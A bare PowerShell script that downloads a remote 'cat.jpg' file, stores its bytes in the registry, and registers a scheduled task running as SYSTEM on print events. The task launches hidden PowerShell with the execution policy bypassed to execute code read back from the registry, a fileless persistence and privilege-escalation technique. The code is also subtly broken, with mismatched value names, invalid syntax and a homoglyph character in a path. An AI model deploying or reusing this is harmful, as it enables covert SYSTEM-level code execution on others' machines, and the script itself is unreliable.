$script_name = BananaCat
$reg_path = "HKCU:\Software\$script_name"
$scriptCode = -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'Invoke-Expression (Get-ItemProperty -Path $reg_path -Name "$script_name").MyScript'

$IMAGE_NAME=BananaCat
$CAT_IMAGE_OUT=%TEMP%\$IMAGE_NAME.jpg
$CAT_IMAGE_URI=https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/heads/main/cat.jpg

Invoke-WebRequest -Uri "$CAT_IMAGE_URI" -OutFile "$CAT_IMAGE_OUT""  > nul 2>&1

$xmlTemplate = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\проект_разгром</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-PrintService/Operational"&gt;&lt;Select Path="Microsoft-Windows-PrintService/Operational"&gt;*[System[EventID=800]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>$scriptCode</Arguments>
      <WorkingDirectory>E:\Downloads\ѕроект_разгром</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

[xml]$xml = $xmlTemplate

$tmpXmlPath = "$env:TEMP\task_temp.xml"
$xml.Save($tmpXmlPath)

schtasks /Create /TN "проект_разгром" /XML $tmpXmlPath /F

Remove-Item $tmpXmlPath


$bytes = [System.IO.File]::ReadAllBytes($CAT_IMAGE_OUT)

New-Item -Path $reg_path -Force | Out-Null
Set-ItemProperty -Path $reg_path -Name "$IMAGE_NAME" -Value $bytes